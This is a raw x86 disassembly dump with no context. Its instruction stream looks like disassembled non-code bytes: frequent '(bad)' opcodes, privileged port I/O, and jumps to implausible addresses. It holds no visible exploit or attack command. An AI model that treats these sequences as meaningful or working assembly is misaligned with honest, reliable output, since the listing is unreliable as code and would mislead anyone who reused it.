  423e68:	fld    DWORD PTR [edx+0x26]
  423e6b:	scas   eax,DWORD PTR es:[edi]
  423e6c:	push   ds
  423e6d:	inc    edi
  423e6e:	sub    DWORD PTR [edi-0x15bc9b98],0xffffffad
  423e75:	push   eax
  423e76:	out    0x78,al
  423e78:	in     al,dx
  423e79:	mov    ch,0xea
  423e7b:	rcl    DWORD PTR [edi-0x24],1
  423e7e:	jo     0x423ef3
  423e80:	das    
  423e81:	jae    0x423e6c
  423e83:	jl     0x423ed8
  423e85:	js     0x423e07
  423e87:	lods   eax,DWORD PTR ds:[esi]
  423e88:	out    0x98,al
  423e8a:	fstp   QWORD PTR [edi+edi*8-0x39]
  423e8e:	or     DWORD PTR [edx+0xc052064],eax
  423e94:	sbb    cl,BYTE PTR [esi]
  423e96:	nop
  423e97:	pop    edi
  423e98:	mov    WORD PTR [ecx-0x52],gs
  423e9b:	ins    DWORD PTR es:[edi],dx
  423e9c:	mov    esp,0xb989b7ae
  423ea1:	cmc    
  423ea2:	addr16 sub eax,0xadbdd8b
  423ea8:	ficom  WORD PTR [ebx+edi*8-0x19a1dd56]
  423eaf:	push   es
  423eb0:	sub    ebx,DWORD PTR [edx+0x19464b97]
  423eb6:	sahf   
  423eb7:	mov    ah,0x56
  423eb9:	fsub   DWORD PTR [ecx-0x3367cb45]
  423ebf:	leave  
  423ec0:	stos   BYTE PTR es:[edi],al
  423ec1:	mov    edx,0x82f6d41
  423ec6:	add    al,0xeb
  423ec8:	pop    ecx
  423ec9:	int3   
  423eca:	xchg   edi,eax
  423ecb:	test   eax,0xb8df15b0
  423ed0:	adc    eax,0x4e77f83
  423ed5:	mov    eax,ds:0xd9ffbc01
  423eda:	xchg   ebp,edx
  423edc:	shl    edx,0x1b
  423edf:	int    0xdf
  423ee1:	jl     0x423ec7
  423ee3:	mov    cl,0xb0
  423ee5:	mov    ebp,0x18f113c1
  423eea:	aaa    
  423eeb:	sub    bh,BYTE PTR [ecx]
  423eed:	xor    DWORD PTR [ecx],esp
  423eef:	adc    eax,0x83f67ae8
  423ef4:	ins    DWORD PTR es:[edi],dx
  423ef5:	adc    eax,0xdab7da72
  423efa:	ins    BYTE PTR es:[edi],dx
  423efb:	sub    cl,BYTE PTR [edi]
  423efd:	push   ss
  423efe:	mov    eax,ecx
  423f00:	out    0x9e,al
  423f02:	lock aas 
  423f04:	xchg   DWORD PTR es:[ebp+eax*1-0x4c],ebp
  423f09:	pushf  
  423f0a:	das    
  423f0b:	mov    eax,0xc7bab10c
  423f10:	fnstsw WORD PTR [ebx+0x60aaf4ef]
  423f16:	add    ah,al
  423f18:	in     al,dx
  423f19:	les    edi,FWORD PTR [ebp+0x74]
  423f1c:	mov    esi,0x12af23cf
  423f21:	or     DWORD PTR [ebx-0x5b],esp
  423f24:	mov    ds:0x90ec350,al
  423f29:	aaa    
  423f2a:	jmp    0x423f84
  423f2c:	sbb    esp,DWORD PTR [ebx+0x3dd46207]
  423f32:	fnstsw WORD PTR [ecx]
  423f34:	stos   BYTE PTR es:[edi],al
  423f35:	sbb    BYTE PTR [ecx],0x86
  423f38:	inc    edx
  423f39:	push   ecx
  423f3a:	jp     0x423f05
  423f3c:	aaa    
  423f3d:	dec    edx
  423f3e:	and    bl,BYTE PTR [esi+ebx*1]
  423f41:	fnstsw ax
  423f43:	fwait
  423f44:	lods   eax,DWORD PTR ds:[esi]
  423f45:	test   eax,0x10282b9b
  423f4a:	ja     0x423f98
  423f4c:	mov    bl,0x83
  423f4e:	(bad)  
  423f4f:	xor    BYTE PTR [ecx-0x4f086b3c],cl
  423f55:	loope  0x423f57
  423f57:	add    eax,0xabbc2faf
  423f5c:	mov    eax,ds:0xcf08ab1c
  423f61:	push   cs
  423f62:	push   edi
  423f63:	add    BYTE PTR [ebp-0x24867792],bl
  423f69:	jno    0x423f60
  423f6b:	or     eax,0xd17ef058
  423f70:	lds    edx,FWORD PTR [ebx]
  423f72:	cmc    
  423f73:	fidiv  DWORD PTR [edx-0x6a]
  423f76:	xchg   ebp,eax
  423f77:	sahf   
  423f78:	pop    esp
  423f79:	hlt    
  423f7a:	mov    al,0x53
  423f7c:	bound  esp,QWORD PTR [ebx]
  423f7e:	adc    edx,DWORD PTR [edi+0xb]
  423f81:	aam    0x8a
  423f83:	xchg   esi,eax
  423f84:	sahf   
  423f85:	and    ebp,DWORD PTR [edi-0x58d8d6e1]
  423f8b:	cli    
  423f8c:	imul   esp,DWORD PTR [edx+0x115bb472],0x31
  423f93:	jp     0x423f47
  423f95:	lds    ecx,FWORD PTR [edx+0x2a]
  423f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f99:	xchg   DWORD PTR [ecx],ebp
  423f9b:	xchg   edi,eax
  423f9c:	mov    DWORD PTR [edx-0x7a],ecx
  423f9f:	mov    ah,0xdb
  423fa1:	jnp    0x423f2b
  423fa3:	shl    BYTE PTR [edx+0x2fcc266c],cl
  423fa9:	cmp    eax,0x9c2210f9
  423fae:	mov    al,ds:0x4823cf9
  423fb3:	test   DWORD PTR [ecx],0xd604318a
  423fb9:	sbb    eax,0x44e91e0
  423fbe:	int3   
  423fbf:	jle    0x423fb2
  423fc1:	fild   WORD PTR [ebx]
  423fc3:	cmp    eax,0xfc347322
  423fc8:	mov    bh,0x2e
  423fca:	sbb    al,0xf5
  423fcc:	jmp    0x933884b9
  423fd1:	pop    esi
  423fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fd3:	imul   esi,ebp,0x4e
  423fd6:	daa    
  423fd7:	test   ebp,edx
  423fd9:	aam    0x26
  423fdb:	pop    ecx
  423fdc:	jbe    0x423f7c
  423fde:	and    al,BYTE PTR [ecx-0x49]
  423fe1:	sbb    bh,BYTE PTR [edi]
  423fe3:	ins    BYTE PTR es:[edi],dx
  423fe4:	push   edi
  423fe5:	into   
  423fe6:	xor    BYTE PTR [edx+0x170f984],al
  423fec:	ins    BYTE PTR es:[edi],dx
  423fed:	jmp    0xd4806f3b
  423ff2:	cmp    BYTE PTR [eax],ch
  423ff4:	cmp    bl,dh
  423ff6:	mov    bh,0x2a
  423ff8:	xchg   edi,eax
  423ff9:	(bad)  
  423ffa:	loop   0x42404d
  423ffc:	xchg   esi,eax
  423ffd:	leave  
  423ffe:	mov    ch,0x98
  424000:	shl    BYTE PTR [esi-0x77e77880],cl
  424006:	bnd addr16 jge 0x424075
  42400a:	and    edi,DWORD PTR gs:[ecx-0x77671996]
  424011:	imul   eax,DWORD PTR [edx+eax*1],0xb78518f3
  424018:	and    bl,bl
  42401a:	push   ebp
  42401b:	in     al,dx
  42401c:	adc    al,0x6f
  42401e:	push   0x77230d6e
  424023:	cdq    
  424024:	stos   DWORD PTR es:[edi],eax
  424025:	or     al,BYTE PTR [esi+eax*2+0x5c13223]
  42402c:	(bad)  
  42402d:	jl     0x423ff6
  42402f:	inc    edx
  424030:	xor    ebx,DWORD PTR ds:0xa68d4070
  424036:	sbb    eax,0x4ff14965
  42403b:	and    cl,bh
  42403d:	mov    WORD PTR [eax+0x64154f5a],ss
  424043:	or     ch,cl
  424045:	sbb    BYTE PTR fs:[esi],bh
  424048:	cli    
  424049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42404a:	inc    edx
  42404b:	dec    esp
  42404c:	dec    ebx
  42404d:	xor    eax,0x84ef544b
  424052:	test   eax,0x18ecca6b
  424057:	dec    edx
  424058:	fcomp  QWORD PTR [ecx-0x5b]
  42405b:	pop    eax
  42405c:	pop    ds
  42405d:	lods   eax,DWORD PTR ds:[esi]
  42405e:	mov    esp,DWORD PTR [eax+ecx*4]
  424061:	push   edx
  424062:	call   FWORD PTR [ecx-0x5d]
  424065:	fs mov edi,0x1f4861b9
  42406b:	xchg   edx,eax
  42406c:	std    
  42406d:	xlat   BYTE PTR fs:[ebx]
  42406f:	sub    eax,0x41dec279
  424074:	ficomp WORD PTR [edi+0x11]
  424077:	push   cs
  424078:	add    ebp,DWORD PTR [eax-0x70]
  42407b:	pop    ebp
  42407c:	sti    
  42407d:	adc    DWORD PTR [ecx+eiz*1],edi
  424080:	pop    eax
  424081:	out    dx,eax
  424082:	dec    esi
  424083:	dec    esp
  424084:	jo     0x42408b
  424086:	cs sub eax,0x74f06aa3
  42408c:	cdq    
  42408d:	scas   al,BYTE PTR es:[edi]
  42408e:	or     BYTE PTR [ecx],cl
  424090:	push   ss
  424091:	sub    BYTE PTR [ebx+0x3fc4b901],dh
  424097:	mov    cl,dh
  424099:	aam    0xcc
  42409b:	xor    eax,0x14b2fd06
  4240a0:	mov    edi,0xa6f6b0d3
  4240a5:	mov    bl,0x9c
  4240a7:	lock ret 
  4240a9:	mov    ss:0x7d1855f7,eax
  4240af:	pop    ebx
  4240b0:	push   es
  4240b1:	mov    ebp,esp
  4240b3:	xor    BYTE PTR [edi-0x54],ch
  4240b6:	in     eax,0x74
  4240b8:	pop    ss
  4240b9:	sub    BYTE PTR [eax-0x51],al
  4240bc:	repnz mov esi,DWORD PTR [ebx]
  4240bf:	daa    
  4240c0:	and    eax,0xe2a16c3f
  4240c5:	arpl   WORD PTR [eax],sp
  4240c7:	daa    
  4240c8:	push   ds
  4240c9:	fistp  WORD PTR [esi-0x2dcacd05]
  4240cf:	xchg   ebx,eax
  4240d0:	adc    eax,0xc7edb800
  4240d5:	enter  0x6310,0xc0
  4240d9:	mov    BYTE PTR [edi],ah
  4240db:	push   ebx
  4240dc:	jge    0x424105
  4240de:	es mov ecx,0xa3fecebb
  4240e4:	jae    0x424145
  4240e6:	push   edx
  4240e7:	cdq    
  4240e8:	cmp    bh,0x42
  4240eb:	jne    0x42413c
  4240ed:	and    BYTE PTR [esi+0x71],bl
  4240f0:	mov    ebx,0x7b51c167
  4240f5:	test   BYTE PTR [edx+esi*8-0x62],ch
  4240f9:	clc    
  4240fa:	jp     0x424093
  4240fc:	mov    ebp,0x97632815
  424101:	sub    eax,0x7eb2aaad
  424106:	cli    
  424107:	addr16 xor al,0xc0
  42410a:	enter  0x7ecc,0x10
  42410e:	out    0xd5,eax
  424110:	jl     0x4240ea
  424112:	mov    edx,0x269442b3
  424118:	ret    
  424119:	rol    DWORD PTR [ebx-0x80],cl
  42411c:	or     eax,0xad7938b4
  424121:	loop   0x42414d
  424123:	adc    ecx,DWORD PTR [ebx-0xe]
  424126:	out    0xb2,eax
  424128:	push   esi
  424129:	sbb    DWORD PTR [ecx+edi*8+0x3aa5ba90],ebx
  424130:	xchg   ecx,eax
  424131:	fs loopne 0x424132
  424134:	mov    edx,eax
  424136:	xor    eax,0xaf14cf91
  42413b:	xor    ebx,DWORD PTR [edi+0x27]
  42413e:	adc    esp,DWORD PTR [eax+0x297463fb]
  424144:	push   ds
  424145:	nop
  424146:	out    dx,eax
  424147:	pop    es
  424148:	cmp    BYTE PTR [ebx-0x5f],0x7d
  42414c:	fwait
  42414d:	popa   
  42414e:	addr16 push edx
  424150:	das    
  424151:	(bad)  
  424152:	sbb    al,0x8d
  424154:	test   DWORD PTR [edx+0x42],esi
  424157:	rcl    DWORD PTR [ecx-0x68],cl
  42415a:	jl     0x4240f5
  42415c:	iret   
  42415d:	pushf  
  42415e:	les    esp,FWORD PTR [ebx+esi*4-0x5b2f3eb0]
  424165:	cli    
  424166:	fsub   DWORD PTR [edx-0x44]
  424169:	sub    BYTE PTR [esi+0x7413b2bf],0xd8
  424170:	inc    ebx
  424171:	retf   0xc679
  424174:	aaa    
  424175:	arpl   WORD PTR [ecx+0x30],ax
  424178:	je     0x424133
  42417a:	test   eax,0x7dbd58f7
  42417f:	not    al
  424181:	je     0x42419d
  424183:	jl     0x42413d
  424185:	push   0xe5189424
  42418a:	outs   dx,BYTE PTR ds:[esi]
  42418b:	imul   edi,DWORD PTR [esi+0x40],0xffffff9f
  42418f:	dec    ebp
  424190:	leave  
  424191:	adc    ah,BYTE PTR [ebp+0x29f8a117]
  424197:	fisttp WORD PTR [edi]
  424199:	inc    eax
  42419a:	leave  
  42419b:	and    eax,0xf8392db7
  4241a0:	jmp    0xf821da4d
  4241a5:	scas   al,BYTE PTR es:[edi]
  4241a6:	aas    
  4241a7:	scas   eax,DWORD PTR es:[edi]
  4241a8:	(bad)  [edi-0x4e]
  4241ab:	sub    BYTE PTR [ecx+ecx*2-0x45],0xb3
  4241b0:	sbb    DWORD PTR [ebx],ebp
  4241b2:	jb     0x424141
  4241b4:	fs hlt 
  4241b6:	push   ds
  4241b7:	xchg   ecx,eax
  4241b8:	mov    ds:0xeaf52d90,eax
  4241bd:	cmp    ch,BYTE PTR [edi]
  4241bf:	adc    BYTE PTR [ebp+esi*8-0x68],dl
  4241c3:	xchg   ebx,eax
  4241c4:	in     al,dx
  4241c5:	repz (bad) 
  4241c7:	push   0xffffff97
  4241c9:	sti    
  4241ca:	xchg   edi,eax
  4241cb:	sub    dh,dh
  4241cd:	mov    ch,0x40
  4241cf:	inc    al
  4241d1:	(bad)  
  4241d2:	jl     0x4241f7
  4241d4:	cld    
  4241d5:	ret    0x2012
  4241d8:	push   edx
  4241d9:	std    
  4241da:	and    cl,0x8c
  4241dd:	pop    edi
  4241de:	cmc    
  4241df:	ret    
  4241e0:	adc    eax,0xe96407c3
  4241e5:	mov    ebx,0x386c7cc7
  4241ea:	mov    ebx,edx
  4241ec:	js     0x424234
  4241ee:	aas    
  4241ef:	push   edi
  4241f0:	stos   BYTE PTR es:[edi],al
  4241f1:	and    bh,BYTE PTR [ebx]
  4241f3:	(bad)  
  4241f4:	rol    esp,cl
  4241f6:	jo     0x42422a
  4241f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241f9:	pop    edx
  4241fa:	cwde   
  4241fb:	daa    
  4241fc:	repnz retf 0x1b3e
  424200:	inc    esp
  424201:	stos   DWORD PTR es:[edi],eax
  424202:	add    eax,0x28fd8252
  424207:	xlat   BYTE PTR ds:[ebx]
  424208:	(bad)  
  424209:	rol    BYTE PTR [ecx+0x55],0xe5
  42420d:	repnz sar BYTE PTR ds:0x272bca6d,cl
  424214:	cmp    ah,bl
  424216:	scas   eax,DWORD PTR es:[edi]
  424217:	js     0x42426e
  424219:	mov    bh,0xf9
  42421b:	pop    ebp
  42421c:	cmp    BYTE PTR [edi+ebp*2],0x3
  424220:	aad    0x99
  424222:	fist   DWORD PTR [edi-0x17]
  424225:	add    al,0x3c
  424227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424228:	data16 mov cl,bh
  42422b:	fisub  WORD PTR [esi-0x61]
  42422e:	lahf   
  42422f:	add    BYTE PTR [edi],bl
  424231:	popf   
  424232:	loopne 0x4241d7
  424234:	adc    al,0x98
  424236:	jp     0x42429a
  424238:	add    al,0xd8
  42423a:	mov    eax,ds:0xb7079585
  42423f:	mov    DWORD PTR [ecx],eax
  424241:	lock mov fs,ecx
  424244:	dec    edx
  424245:	dec    ebp
  424246:	xchg   bl,dl
  424248:	xchg   BYTE PTR [ebx+0x72],al
  42424b:	xchg   edi,eax
  42424c:	in     al,dx
  42424d:	pop    ss
  42424e:	pop    ecx
  42424f:	jnp    0x424297
  424251:	xchg   BYTE PTR [edi+0x165318e5],ch
  424257:	mov    esi,esi
  424259:	sti    
  42425a:	jns    0x4242af
  42425c:	(bad)  
  42425e:	(bad)  
  42425f:	mov    esp,0xa2ff5b74
  424264:	sbb    esi,DWORD PTR [edx+0x67332196]
  42426a:	stos   DWORD PTR es:[edi],eax
  42426b:	stc    
  42426c:	sub    DWORD PTR [ebp-0x9bf2070],esp
  424272:	inc    ebp
  424273:	(bad)  
  424274:	xchg   esp,eax
  424275:	push   0xffffffc7
  424277:	mov    ebx,0xa254887a
  42427c:	inc    ebp
  42427d:	scas   eax,DWORD PTR es:[edi]
  42427e:	ret    
  42427f:	push   cs
  424280:	mov    ecx,0xb3b53090
  424285:	js     0x424239
  424287:	sahf   
  424288:	call   FWORD PTR [esi+ecx*8-0x1d8268ec]
  42428f:	jecxz  0x4242fa
  424291:	imul   edi,DWORD PTR ds:0xda77c81e,0x1c
  424298:	mov    eax,0x6b5d31b8
  42429d:	aad    0x8e
  42429f:	add    esi,esp
  4242a1:	fwait
  4242a2:	ds out dx,eax
  4242a4:	ret    0xbcdd
  4242a7:	ror    BYTE PTR [ebx-0x6f],0xc6
  4242ab:	addr16 sub bl,0xef
  4242af:	mov    ch,0xc3
  4242b1:	and    BYTE PTR [ebx+ebp*8-0xb],bh
  4242b5:	fadd   DWORD PTR [edi+0x68]
  4242b8:	jne    0x4242ab
  4242ba:	pop    edi
  4242bb:	or     eax,0x3deb3987
  4242c0:	loop   0x4242e6
  4242c2:	xchg   ebx,eax
  4242c3:	jl     0x424304
  4242c5:	jmp    0x2b871380
  4242ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242cb:	sub    DWORD PTR [edi-0x4a],ebx
  4242ce:	adc    BYTE PTR [esi],ch
  4242d0:	popa   
  4242d1:	int3   
  4242d2:	ds and eax,0x90070b8c
  4242d8:	nop
  4242d9:	in     eax,0x6b
  4242db:	imul   ebx,DWORD PTR [ecx],0x8e26f21f
  4242e1:	fld    QWORD PTR [edx+esi*1-0x3ac29a2c]
  4242e8:	verw   WORD PTR [edx-0x2afe2f39]
  4242ef:	ret    0xe03
  4242f2:	dec    edx
  4242f3:	ret    
  4242f4:	xor    BYTE PTR [ebx-0x7388691a],dl
  4242fa:	test   eax,0x393fe02
  4242ff:	loope  0x424360
  424301:	xor    ebx,edi
  424303:	push   esp
  424304:	push   ebx
  424305:	xchg   esi,ebp
  424307:	sbb    ah,BYTE PTR es:[ebx+ebx*8-0x7c]
  42430c:	mov    eax,ds:0x79195aed
  424311:	cs cmc 
  424313:	js     0x42433d
  424315:	leave  
  424316:	enter  0x754e,0x1d
  42431a:	mov    al,0xe7
  42431c:	out    dx,al
  42431d:	cmp    esp,esi
  42431f:	es and al,0xf6
  424322:	jmp    0x85985c28
  424327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424328:	sbb    al,0x58
  42432a:	cli    
  42432b:	inc    eax
  42432c:	xlat   BYTE PTR ds:[ebx]
  42432d:	in     al,0x29
  42432f:	popf   
  424330:	and    ebx,eax
  424332:	dec    esi
  424333:	lahf   
  424334:	hlt    
  424335:	and    al,BYTE PTR [eax]
  424337:	add    eax,0x3aca5fe0
  42433c:	adc    DWORD PTR [ebp-0x23cb7199],ebp
  424342:	jae    0x4243ac
  424344:	push   esp
  424345:	cmp    BYTE PTR [ecx-0x18c5c65d],al
  42434b:	inc    esi
  42434c:	pusha  
  42434d:	pop    ebx
  42434e:	in     eax,dx
  42434f:	xchg   edi,eax
  424350:	jl     0x4242f3
  424352:	push   ecx
  424353:	(bad)  
  424354:	nop
  424355:	repnz sbb al,0x16
  424358:	push   esi
  424359:	sub    BYTE PTR [edi],dh
  42435b:	adc    bh,0x92
  42435e:	xchg   DWORD PTR [eax+0x4a0d7116],edx
  424364:	outs   dx,BYTE PTR ds:[esi]
  424365:	fidivr DWORD PTR [esi-0xbe483dc]
  42436b:	les    edi,FWORD PTR [edx-0x44e7dd06]
  424371:	xchg   ecx,eax
  424372:	js     0x4243e2
  424374:	mov    bl,0x31
  424376:	sbb    eax,0x7e866c24
  42437b:	jne    0x42434c
  42437d:	leave  
  42437e:	inc    eax
  42437f:	inc    edi
  424380:	mov    eax,edx
  424382:	pop    esp
  424383:	(bad)  
  424384:	xor    eax,edx
  424386:	loop   0x424403
  424388:	clc    
  424389:	mov    edi,0x249c6391
  42438e:	adc    DWORD PTR [edx],ecx
  424390:	out    0x41,al
  424392:	xchg   esp,eax
  424393:	mov    BYTE PTR [edi+0x6],dl
  424396:	or     ch,BYTE PTR [edi+0x242213b6]
  42439c:	xchg   dl,al
  42439e:	xchg   esp,eax
  42439f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243a0:	cmc    
  4243a1:	mov    WORD PTR [ebp-0x7],fs
  4243a4:	hlt    
  4243a5:	arpl   bx,sp
  4243a7:	mov    dh,0x7a
  4243a9:	lods   al,BYTE PTR es:[esi]
  4243ab:	ret    0x6b00
  4243ae:	inc    eax
  4243af:	push   ecx
  4243b0:	jmp    0xf0cfb0
  4243b5:	pop    esi
  4243b6:	cmp    edi,DWORD PTR [edx-0x11]
  4243b9:	cld    
  4243ba:	imul   esp,DWORD PTR [edi],0x929f379b
  4243c0:	cs jmp 0x424385
  4243c3:	pusha  
  4243c4:	cwde   
  4243c5:	repz das 
  4243c7:	and    eax,DWORD PTR [eax]
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x42443d
  4243d7:	std    
  4243d8:	test   ah,0x1e
  4243db:	rol    BYTE PTR [ecx],cl
  4243dd:	add    BYTE PTR [esi-0x61fffffa],al
  4243e3:	scas   al,BYTE PTR es:[edi]
  4243e4:	mov    eax,ds:0x2de02cb0
  4243e9:	push   ds
  4243ea:	inc    ebx
  4243eb:	mov    es,eax
  4243ed:	inc    esi
  4243ee:	or     bh,BYTE PTR [edx-0x496074a]
  4243f4:	adc    esi,edi
  4243f6:	inc    ebp
  4243f7:	das    
  4243f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243f9:	xchg   edi,eax
  4243fa:	out    dx,al
  4243fb:	xchg   ebx,eax
  4243fc:	iret   
  4243fd:	mov    eax,0x6a35097f
  424402:	adc    DWORD PTR [eax-0x47],ecx
  424405:	xor    DWORD PTR [ebx+0x11],0x3a
  424409:	es push 0xffffffac
  42440c:	xchg   esi,eax
  42440d:	jb     0x42439d
  42440f:	lock inc eax
  424411:	mov    ds:0xc1c66e5,eax
  424416:	repnz mov esi,0x68222a75
  42441c:	inc    esi
  42441d:	add    al,0xf8
  42441f:	test   cl,ch
  424421:	xchg   DWORD PTR [ebx+ebp*2],ebp
  424424:	push   ds
  424425:	ins    DWORD PTR es:[edi],dx
  424426:	or     BYTE PTR [eax+0x7f],dh
  424429:	in     al,0x6f
  42442b:	test   al,0x62
  42442d:	mov    eax,ds:0xa611dbeb
  424432:	jne    0x4243c9
  424434:	stos   DWORD PTR es:[edi],eax
  424435:	iret   
  424436:	sti    
  424437:	mov    ah,0xea
  424439:	cmp    eax,0x3e93548c
  42443e:	dec    eax
  42443f:	push   edi
  424440:	sti    
  424441:	mov    edx,0x52a34d1
  424446:	pop    ss
  424447:	out    dx,eax
  424448:	sub    dh,BYTE PTR [ecx-0x3]
  42444b:	cdq    
  42444c:	aaa    
  42444d:	jnp    0x424425
  42444f:	repz xchg ecx,eax
  424451:	cld    
  424452:	push   si
  424454:	rol    DWORD PTR fs:[edx+0x1e],cl
  424458:	mov    ?,ecx
  42445a:	xlat   BYTE PTR ds:[ebx]
  42445b:	xchg   BYTE PTR [edx-0x47],ah
  42445e:	(bad)  
  42445f:	sub    ebx,edi
  424461:	nop
  424462:	adc    al,0x1c
  424464:	js     0x42441c
  424466:	jmp    0x42443d
  424468:	push   cs
  424469:	mov    edi,0x582154b6
  42446e:	xor    ebx,DWORD PTR [edx]
  424470:	int3   
  424471:	lds    edx,FWORD PTR [edi+ebx*8-0x1a]
  424475:	sbb    esi,DWORD PTR [ebp+0x9]
  424478:	or     cl,BYTE PTR [edx]
  42447a:	xchg   ebp,eax
  42447b:	jbe    0x424414
  42447d:	xor    al,BYTE PTR [edi+0x15]
  424480:	call   0xc7af5fa8
  424485:	aad    0x83
  424487:	mov    dh,0x82
  424489:	imul   edi,edx,0x47ed85bc
  42448f:	inc    ebp
  424490:	fcomp  DWORD PTR [edi+ebx*4+0x2e]
  424494:	fwait
  424495:	pop    esi
  424496:	push   ds
  424497:	fwait
  424498:	lods   eax,DWORD PTR ds:[esi]
  424499:	and    al,0xf7
  42449b:	sti    
  42449c:	ret    0xc0fc
  42449f:	std    
  4244a0:	push   edx
  4244a2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244a4:	push   ss
  4244a5:	dec    edx
  4244a6:	jae    0x4244d7
  4244a8:	fadd   DWORD PTR [esi]
  4244aa:	inc    esp
  4244ab:	adc    bh,BYTE PTR [ebp+0x17]
  4244ae:	adc    dl,bl
  4244b0:	mov    cl,0x12
  4244b2:	leave  
  4244b3:	retf   
  4244b4:	(bad)  
  4244b6:	not    edx
  4244b8:	jo     0x4244ce
  4244ba:	and    eax,0x4bee6d4d
  4244bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244c0:	leave  
  4244c1:	hlt    
  4244c2:	mov    edi,0x1965b818
  4244c7:	sub    ch,al
  4244c9:	call   0x968d3433
  4244ce:	lock arpl WORD PTR [eax],sp
  4244d1:	sub    esi,ebx
  4244d3:	(bad)  
  4244d4:	adc    eax,0x6a6a5d2e
  4244d9:	pop    eax
  4244da:	mov    dh,0x81
  4244dc:	jp     0x424553
  4244de:	mov    esp,0x958b7477
  4244e3:	cwde   
  4244e4:	and    DWORD PTR ss:[ecx-0x23c9ef98],edx
  4244eb:	pop    esi
  4244ec:	ss and eax,0x3fa77021
  4244f2:	jb     0x42453a
  4244f4:	add    al,0xa8
  4244f6:	and    eax,DWORD PTR [ebx]
  4244f8:	fcomp  QWORD PTR [edx]
  4244fa:	mov    esi,fs
  4244fc:	in     eax,dx
  4244fd:	enter  0x35f6,0x30
  424501:	cmp    al,0xf0
  424503:	mov    bh,0xa4
  424505:	mov    esi,0xd666ba4b
  42450a:	adc    esp,DWORD PTR [ebx+0x54aacba6]
  424510:	test   BYTE PTR [esi+0x2886e221],cl
  424516:	sub    al,0xea
  424518:	sub    BYTE PTR [ecx+0x23],dl
  42451b:	cs stc 
  42451d:	sbb    bl,BYTE PTR [esi+0x15]
  424520:	jg     0x4244c3
  424522:	fwait
  424523:	cmp    DWORD PTR [ecx],ebx
  424525:	push   cs
  424526:	repnz ds xor ah,dl
  42452a:	mov    ecx,DWORD PTR [edx+0x28]
  42452d:	or     BYTE PTR [esi],dh
  42452f:	ret    0xa539
  424532:	mov    eax,esp
  424534:	sub    DWORD PTR [esi-0x2ccd749e],0x50
  42453b:	and    edi,ebp
  42453d:	dec    eax
  42453e:	leave  
  42453f:	dec    ecx
  424540:	push   esi
  424541:	sub    al,0x67
  424543:	test   al,0x9e
  424545:	mov    eax,ds:0x8afcaf8
  42454a:	popa   
  42454b:	and    al,0x16
  42454d:	and    eax,DWORD PTR [ecx-0x73]
  424550:	adc    eax,0x2fccaec3
  424555:	xor    BYTE PTR [edx],bl
  424557:	sbb    ch,BYTE PTR [eax+0x26f77e3a]
  42455d:	int3   
  42455e:	in     eax,dx
  42455f:	jmp    0xb2f5:0x4112b128
  424566:	push   edi
  424567:	clc    
  424568:	mov    ds:0xa38a98e1,al
  42456d:	add    eax,0xabc3ddcd
  424572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424573:	int    0x2
  424575:	maxps  xmm0,XMMWORD PTR [esp+0x72]
  42457a:	into   
  42457b:	jp     0x42453b
  42457d:	xchg   DWORD PTR [ebx],ebx
  42457f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424580:	hlt    
  424581:	mov    ebp,0xae848721
  424586:	cmp    al,ch
  424588:	popa   
  424589:	es inc ebp
  42458b:	cmp    al,0xb8
  42458d:	inc    ecx
  42458e:	adc    eax,0x8c8b5348
  424593:	push   0xffffffe7
  424595:	cmp    eax,0x5c222acd
  42459a:	cmp    al,0xc4
  42459c:	mov    bl,BYTE PTR [eax+0x41]
  42459f:	or     edx,DWORD PTR [edx]
  4245a1:	js     0x4245ef
  4245a3:	sub    al,0xb5
  4245a5:	not    BYTE PTR [ebx+esi*8+0x64]
  4245a9:	add    DWORD PTR [eax],edi
  4245ab:	ja     0x4245a7
  4245ad:	clc    
  4245ae:	les    ecx,FWORD PTR [esp+eiz*8-0x64]
  4245b2:	das    
  4245b3:	xor    DWORD PTR [esi],eax
  4245b5:	neg    DWORD PTR [ecx+0x1df2da7f]
  4245bb:	jmp    FWORD PTR [eax-0x7c9fc6ef]
  4245c1:	(bad)  
  4245c2:	fcmovnbe st,st(4)
  4245c4:	(bad)  
  4245c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245c6:	jl     0x4245ae
  4245c8:	mov    ebx,0x4270d0ba
  4245cd:	inc    edi
  4245ce:	call   0xa8bffda6
  4245d3:	ret    
  4245d4:	mov    eax,ds:0xf83a9e9f
  4245d9:	mov    ds:0x5bc94873,eax
  4245de:	jmp    0x7e7c:0x38d8f980
  4245e5:	lods   al,BYTE PTR ds:[esi]
  4245e6:	mov    eax,0x20e47b88
  4245eb:	adc    edi,DWORD PTR [edi]
  4245ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245ee:	pop    es
  4245ef:	mov    eax,0x995d1fbe
  4245f4:	rcl    ecx,cl
  4245f6:	xlat   BYTE PTR ds:[ebx]
  4245f7:	rcl    bh,0x1e
  4245fa:	call   0x2d0e:0xb8d693d
  424601:	inc    edi
  424602:	cli    
  424603:	mov    al,0xd1
  424605:	cmp    bh,BYTE PTR [esi+0x45fead9c]
  42460b:	in     al,0x1c
  42460d:	xchg   BYTE PTR [edx+0x6eedf8c4],bl
  424613:	cmp    DWORD PTR [eax+0x25],eax
  424616:	jecxz  0x424679
  424618:	dec    edi
  424619:	aaa    
  42461a:	push   es
  42461b:	dec    ebx
  42461c:	es jno 0x424603
  42461f:	mov    ebx,0x785e30c9
  424624:	(bad)  
  424625:	out    0x74,al
  424627:	aaa    
  424628:	mov    al,ds:0xc82db787
  42462d:	repnz add eax,0x37b07915
